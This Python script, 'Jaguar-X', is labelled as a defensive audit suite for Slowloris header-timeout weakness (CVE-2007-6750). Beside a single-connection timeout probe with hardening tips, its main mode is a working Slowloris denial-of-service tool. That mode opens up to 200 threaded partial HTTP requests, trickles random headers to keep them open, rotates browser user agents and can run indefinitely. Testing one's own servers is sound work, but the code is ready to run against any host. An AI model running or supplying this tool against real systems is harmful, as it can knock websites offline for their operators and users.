#!/usr/bin/env python3
"""
Jaguar-X // HTTP Resilience & Slowloris Timeout Diagnostic Suite
Version 2.0.0
Educational & Defensive Security Research Only

Audits HTTP/HTTPS servers against low-and-slow partial request header starvation
(CVE-2007-6750). Verifies whether web servers (Nginx, Apache, Caddy, HAProxy)
correctly enforce request header read timeouts (e.g. client_header_timeout).
"""

import sys
import os
import time
import socket
import ssl
import random
import threading
import argparse
from typing import List, Optional

class Colors:
    def __init__(self, enabled: bool = True):
        self.enabled = enabled and sys.stdout.isatty()
        self.RESET = "\033[0m" if self.enabled else ""
        self.BOLD = "\033[1m" if self.enabled else ""
        self.DIM = "\033[2m" if self.enabled else ""
        self.CYAN = "\033[38;2;6;182;212m" if self.enabled else ""
        self.GREEN = "\033[38;2;16;185;129m" if self.enabled else ""
        self.AMBER = "\033[38;2;245;158;11m" if self.enabled else ""
        self.RED = "\033[38;2;239;68;68m" if self.enabled else ""
        self.GRAY = "\033[38;2;100;116;139m" if self.enabled else ""
        self.WHITE = "\033[38;2;248;250;252m" if self.enabled else ""

BANNER = r"""
      _                               __  __
     | | __ _  __ _ _   _  __ _ _ __  \ \/ /
  _  | |/ _` |/ _` | | | |/ _` | '__|  \  / 
 | |_| | (_| | (_| | |_| | (_| | |     /  \ 
  \___/ \__,_|\__, |\__,_|\__,_|_|    /_/\_\
              |___/                         
"""

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:129.0) Gecko/20100101 Firefox/129.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148"
]

class AuditStats:
    def __init__(self):
        self.lock = threading.Lock()
        self.active_connections = 0
        self.total_opened = 0
        self.server_timeouts = 0
        self.connection_refused = 0
        self.bytes_sent = 0
        self.start_time = time.time()
        self.response_codes = {}

    def add_connection(self):
        with self.lock:
            self.active_connections += 1
            self.total_opened += 1

    def remove_connection(self, timed_out_by_server: bool = False, response_code: Optional[str] = None):
        with self.lock:
            if self.active_connections > 0:
                self.active_connections -= 1
            if timed_out_by_server:
                self.server_timeouts += 1
            if response_code:
                self.response_codes[response_code] = self.response_codes.get(response_code, 0) + 1

    def add_bytes(self, count: int):
        with self.lock:
            self.bytes_sent += count

    def add_error(self):
        with self.lock:
            self.connection_refused += 1


def create_socket(host: str, port: int, use_ssl: bool, timeout: int) -> Optional[socket.socket]:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        if use_ssl:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            s = ctx.wrap_socket(s, server_hostname=host)
        s.connect((host, port))
        return s
    except Exception:
        return None


def run_diagnostic_audit(host: str, port: int, path: str, use_ssl: bool, max_wait: int, c: Colors):
    """
    Non-disruptive single-connection test to measure the server's HTTP header timeout.
    Determines if the server closes lingering connections (defended) or leaves them open.
    """
    print(f"\n{c.CYAN}[*] Starting Diagnostic Timeout Probe against {host}:{port}{c.RESET}")
    print(f"{c.GRAY}    Protocol: {'HTTPS (TLS)' if use_ssl else 'HTTP'} | Path: {path}{c.RESET}")
    print(f"{c.GRAY}    Max observation window: {max_wait}s{c.RESET}\n")

    t0 = time.time()
    s = create_socket(host, port, use_ssl, timeout=10)
    if not s:
        print(f"{c.RED}[!] Could not connect to {host}:{port}. Host unreachable or port closed.{c.RESET}")
        return

    ua = random.choice(USER_AGENTS)
    initial_headers = (
        f"GET {path}?resilience_check={random.randint(100000, 999999)} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"User-Agent: {ua}\r\n"
        f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
    ).encode("utf-8")

    try:
        s.sendall(initial_headers)
        print(f"{c.GREEN}[+] Connected. Initial partial headers transmitted ({len(initial_headers)} bytes).{c.RESET}")
    except Exception as e:
        print(f"{c.RED}[!] Error transmitting initial headers: {e}{c.RESET}")
        s.close()
        return

    print(f"{c.CYAN}[*] Keeping request incomplete. Sending 1 dummy header byte every 3 seconds...{c.RESET}")

    step = 0
    closed_at = None
    response_received = None

    while (time.time() - t0) < max_wait:
        elapsed = int(time.time() - t0)
        time.sleep(3)
        step += 1
        dummy_header = f"X-Audit-KeepAlive-{step}: {random.randint(1, 99999)}\r\n".encode("utf-8")

        try:
            s.sendall(dummy_header)
            # Attempt non-blocking peek to see if server sent response (like 408 Request Timeout)
            s.settimeout(0.2)
            try:
                data = s.recv(1024)
                if data:
                    raw_resp = data.decode("utf-8", errors="ignore")
                    first_line = raw_resp.split("\r\n")[0]
                    response_received = first_line
                    closed_at = int(time.time() - t0)
                    break
                else:
                    # Connection closed by server (EOF)
                    closed_at = int(time.time() - t0)
                    break
            except socket.timeout:
                pass
            s.settimeout(10)
            print(f"\r{c.GRAY}    [Elapsed: {elapsed}s] Socket open, server holding connection...{c.RESET}", end="", flush=True)
        except (socket.error, BrokenPipeError, ConnectionResetError):
            closed_at = int(time.time() - t0)
            break

    print("\n")
    s.close()

    # Diagnostic Evaluation
    print(f"{c.BOLD}------------------------------------------------------------{c.RESET}")
    print(f"{c.BOLD}             DIAGNOSTIC AUDIT REPORT                        {c.RESET}")
    print(f"{c.BOLD}------------------------------------------------------------{c.RESET}")

    if response_received:
        print(f"{c.GREEN}[DEFENDED] Server actively returned error response:{c.RESET}")
        print(f"  Response: {c.BOLD}{response_received}{c.RESET}")
        print(f"  Closed after: {closed_at}s")
        print(f"{c.GREEN}  Status: Server enforces request timeout policies.{c.RESET}")
    elif closed_at is not None:
        print(f"{c.GREEN}[DEFENDED] Server terminated lingering connection:{c.RESET}")
        print(f"  Closed after: {closed_at}s")
        print(f"{c.GREEN}  Status: Server enforces socket timeout policies (e.g. client_header_timeout).{c.RESET}")
    else:
        print(f"{c.RED}[WARNING - POTENTIALLY VULNERABLE]{c.RESET}")
        print(f"  The server kept the incomplete HTTP request open for > {max_wait}s without terminating.")
        print(f"{c.AMBER}  Status: Server may be susceptible to slow HTTP connection starvation (CVE-2007-6750).{c.RESET}")
        print(f"\n{c.CYAN}Recommended Hardening Configurations:{c.RESET}")
        print("  * Nginx: Set 'client_header_timeout 10s;' and 'client_body_timeout 10s;'")
        print("  * Apache: Enable 'mod_reqtimeout' and set 'RequestReadTimeout header=10-20,MinRate=500'")
        print("  * HAProxy: Configure 'timeout http-request 10s'")

    print(f"{c.BOLD}------------------------------------------------------------{c.RESET}\n")


def worker_routine(host: str, port: int, path: str, use_ssl: bool, interval: int,
                   timeout: int, stop_event: threading.Event, stats: AuditStats):
    """
    Worker thread that maintains slow keep-alive connections within safety parameters.
    """
    while not stop_event.is_set():
        s = create_socket(host, port, use_ssl, timeout)
        if not s:
            stats.add_error()
            time.sleep(2)
            continue

        ua = random.choice(USER_AGENTS)
        initial_payload = (
            f"GET {path}?p={random.randint(1000, 999999)} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"User-Agent: {ua}\r\n"
            f"Accept: text/html,application/xhtml+xml\r\n"
        ).encode("utf-8")

        try:
            s.sendall(initial_payload)
            stats.add_bytes(len(initial_payload))
            stats.add_connection()
        except Exception:
            s.close()
            stats.add_error()
            continue

        server_severed = False
        resp_code = None

        while not stop_event.is_set():
            # Wait for interval or stop event
            if stop_event.wait(interval):
                break

            header_chunk = f"X-a-{random.randint(1, 9999)}: b\r\n".encode("utf-8")
            try:
                s.sendall(header_chunk)
                stats.add_bytes(len(header_chunk))

                # Check if server replied or closed
                s.settimeout(0.1)
                try:
                    data = s.recv(512)
                    if data:
                        raw = data.decode("utf-8", errors="ignore")
                        lines = raw.split("\r\n")
                        if lines and "HTTP" in lines[0]:
                            resp_code = lines[0].split(" ")[1] if len(lines[0].split(" ")) > 1 else "RESP"
                        server_severed = True
                        break
                    else:
                        server_severed = True
                        break
                except socket.timeout:
                    pass
                s.settimeout(timeout)
            except (socket.error, BrokenPipeError, ConnectionResetError):
                server_severed = True
                break

        try:
            s.close()
        except Exception:
            pass

        stats.remove_connection(timed_out_by_server=server_severed, response_code=resp_code)


def main():
    parser = argparse.ArgumentParser(
        description="Jaguar-X: HTTP Resilience & Slowloris Timeout Diagnostic Suite (Educational Security Research)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python3 main.py 127.0.0.1 -p 80 --audit-only
  python3 main.py example.local -p 443 --ssl --connections 30 --duration 60
  python3 main.py staging.internal -p 8080 --connections 50 --interval 10
        """
    )

    parser.add_argument("host", help="Target hostname or IP address to audit")
    parser.add_argument("-p", "--port", type=int, default=80, help="Target TCP port (default: 80, 443 auto-enables SSL)")
    parser.add_argument("-c", "--connections", type=int, default=25, help="Concurrent probe connections (default: 25, safety max: 200)")
    parser.add_argument("-i", "--interval", type=int, default=10, help="Seconds between keep-alive header probes (default: 10s)")
    parser.add_argument("-t", "--timeout", type=int, default=5, help="Socket connect/read timeout in seconds (default: 5s)")
    parser.add_argument("-d", "--duration", type=int, default=60, help="Total test duration in seconds (0 = indefinite, default: 60s)")
    parser.add_argument("--ssl", action="store_true", help="Force TLS/SSL wrapping")
    parser.add_argument("--path", default="/", help="Target request path (default: '/')")
    parser.add_argument("--audit-only", action="store_true", help="Run single-connection non-disruptive timeout diagnostic")
    parser.add_argument("--no-color", action="store_true", help="Disable ANSI color output")

    args = parser.parse_args()
    c = Colors(enabled=not args.no_color)

    # Resolve target
    host = args.host.strip()
    port = args.port
    use_ssl = args.ssl or (port == 443)
    connections = min(max(1, args.connections), 200)

    # Print banner
    print(c.CYAN + BANNER + c.RESET)
    print(f"{c.GRAY}  HTTP Resilience & Timeout Diagnostic Suite | Version 2.0.0{c.RESET}")
    print(f"{c.GRAY}  Defensive Security Research & Server Hardening Engine{c.RESET}\n")

    # Safety Notice
    print(f"{c.AMBER}[!] EDUCATIONAL & AUTHORIZED AUDITING NOTICE:{c.RESET}")
    print(f"{c.GRAY}    This tool is engineered for network resilience verification, firewall testing,{c.RESET}")
    print(f"{c.GRAY}    and web server hardening (CVE-2007-6750). Only test systems you own or have{c.RESET}")
    print(f"{c.GRAY}    explicit written authorization to audit.{c.RESET}\n")

    # Mode 1: Audit Only
    if args.audit_only:
        run_diagnostic_audit(host, port, args.path, use_ssl, max_wait=args.duration or 35, c=c)
        return

    # Mode 2: Multi-connection Resilience Testing
    print(f"{c.CYAN}[*] Target Host       : {c.WHITE}{host}:{port}{c.RESET}")
    print(f"{c.CYAN}[*] Protocol          : {c.WHITE}{'HTTPS (TLS)' if use_ssl else 'HTTP'}{c.RESET}")
    print(f"{c.CYAN}[*] Target Path       : {c.WHITE}{args.path}{c.RESET}")
    print(f"{c.CYAN}[*] Concurrency Limit : {c.WHITE}{connections} sockets{c.RESET}")
    print(f"{c.CYAN}[*] Probe Interval    : {c.WHITE}{args.interval}s{c.RESET}")
    print(f"{c.CYAN}[*] Scheduled Run     : {c.WHITE}{args.duration}s{c.RESET}\n")

    stats = AuditStats()
    stop_event = threading.Event()
    threads: List[threading.Thread] = []

    print(f"{c.GREEN}[+] Initializing {connections} diagnostic worker threads...{c.RESET}")
    for _ in range(connections):
        t = threading.Thread(
            target=worker_routine,
            args=(host, port, args.path, use_ssl, args.interval, args.timeout, stop_event, stats),
            daemon=True
        )
        t.start()
        threads.append(t)

    t_start = time.time()
    try:
        while True:
            elapsed = time.time() - t_start
            if args.duration > 0 and elapsed >= args.duration:
                print(f"\n{c.CYAN}[*] Scheduled audit duration of {args.duration}s reached.{c.RESET}")
                break

            with stats.lock:
                active = stats.active_connections
                closed = stats.server_timeouts
                errs = stats.connection_refused
                kb_sent = stats.bytes_sent / 1024.0
                codes = ", ".join(f"{k}:{v}" for k, v in stats.response_codes.items()) or "None"

            rem_str = f" / {args.duration}s" if args.duration > 0 else ""
            status_line = (
                f"\r{c.CYAN}[*] Active: {c.GREEN}{active:3d}{c.CYAN} | "
                f"Server Terminated: {c.AMBER}{closed:3d}{c.CYAN} | "
                f"Errors: {c.RED}{errs:2d}{c.CYAN} | "
                f"Sent: {c.WHITE}{kb_sent:6.1f} KB{c.CYAN} | "
                f"Codes: [{codes}] | "
                f"Time: {int(elapsed)}s{rem_str}{c.RESET}"
            )
            print(status_line, end="", flush=True)
            time.sleep(1)
    except KeyboardInterrupt:
        print(f"\n{c.AMBER}[!] Interrupted by user (SIGINT). Shutting down connections...{c.RESET}")

    stop_event.set()
    time.sleep(1)

    total_time = int(time.time() - t_start)
    print(f"\n\n{c.BOLD}------------------------------------------------------------{c.RESET}")
    print(f"{c.BOLD}               AUDIT SESSION SUMMARY                        {c.RESET}")
    print(f"{c.BOLD}------------------------------------------------------------{c.RESET}")
    print(f"  Target                 : {host}:{port}")
    print(f"  Total Run Duration     : {total_time}s")
    print(f"  Total Sockets Opened   : {stats.total_opened}")
    print(f"  Server Severed (Defended): {stats.server_timeouts}")
    print(f"  Connection Errors      : {stats.connection_refused}")
    print(f"  Telemetry Transmitted  : {stats.bytes_sent / 1024.0:.2f} KB")

    if stats.server_timeouts > 0:
        print(f"\n{c.GREEN}[+] DEFENSE ASSESSMENT: Server actively dropped lingering partial connections.{c.RESET}")
        print(f"{c.GREEN}    Timeout safeguards appear functional.{c.RESET}")
    elif stats.total_opened > 0 and stats.server_timeouts == 0:
        print(f"\n{c.AMBER}[!] DEFENSE ASSESSMENT: No server-side timeouts observed during the audit.{c.RESET}")
        print(f"{c.AMBER}    Consider reviewing Nginx 'client_header_timeout' or Apache 'mod_reqtimeout'.{c.RESET}")

    print(f"{c.BOLD}------------------------------------------------------------{c.RESET}\n")


if __name__ == "__main__":
    main()
